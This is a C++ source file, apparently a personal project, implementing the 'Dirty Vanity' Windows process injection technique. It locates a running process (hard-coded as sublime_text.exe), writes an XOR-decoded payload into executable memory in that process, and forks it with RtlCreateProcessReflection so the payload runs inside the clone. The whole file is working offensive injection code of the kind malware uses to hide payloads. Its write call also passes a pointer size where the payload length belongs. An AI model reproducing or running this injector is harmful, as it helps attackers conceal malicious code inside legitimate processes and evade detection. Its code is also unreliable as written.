/*
	User:		lemur
	Email:		1emvr@protonmail.com
	GitHub:		https://github.com/1emvr
	Date:		01.16.2023		04:21 AM

	"Dirty Vanity": A process injection technique that exploits the Windows process forking feature.
	Reflecting processes and snapshotting to inject code into a new process.

	It uses the `RtlCreateProcessReflection` or `NtCreateProcess[Ex]` primitives
	along with the `PROCESS_VM_OPERATION`, `PROCESS_CREATE_THREAD` and `NtSetContextThread`
	to write the injected code into the new process.

	A string parameter is passed into a snapshot handler and the target is searched for from a
	PROCESSENTRY32 list, returning the handle/PID for said process.

	Code snippets can be found at: https://unprotect.it/technique/dirty-vanity/
*/
#include <Windows.h>
#include <tlhelp32.h>

#include <iostream>
#include <string>

#include "dirtyvanity.h"
#include "resource.h"

using namespace std;
DWORD GetProcessId(wstring processName) {

	PROCESSENTRY32 processEntryList;
	processEntryList.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}
	Process32First(hSnapshot, &processEntryList);
	if (!processName.compare(processEntryList.szExeFile)) {
		CloseHandle(hSnapshot);
		return processEntryList.th32ProcessID;
	}
	while (Process32Next(hSnapshot, &processEntryList)) {
		if (!processName.compare(processEntryList.szExeFile)) {
			CloseHandle(hSnapshot);
			return processEntryList.th32ProcessID;
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}

int main(void)
{
	Sleep(5000);

	wstring processName = L"sublime_text.exe";
	DWORD pid = GetProcessId(processName);
	SIZE_T bytesWritten = 0;

	HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE, FALSE, pid);
	LPVOID baseAddress = VirtualAllocEx(hProcess, NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	UCHAR *buffer = XorCipher(payload, payloadLen, key, keyLen);
	BOOL status = WriteProcessMemory(hProcess, baseAddress, (LPVOID)buffer, sizeof(buffer), &bytesWritten);

	HMODULE library = LoadLibraryA("ntdll.dll");
	RtlCreateProcessReflection_t pRtlCreateProcessReflection = (RtlCreateProcessReflection_t)GetProcAddress(library, "RtlCreateProcessReflection");
	T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION reflection_info = { 0 };

	NTSTATUS reflectReturn = pRtlCreateProcessReflection(hProcess, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE, baseAddress, NULL,	NULL, &reflection_info);
	return reflectReturn;
}
/*


*/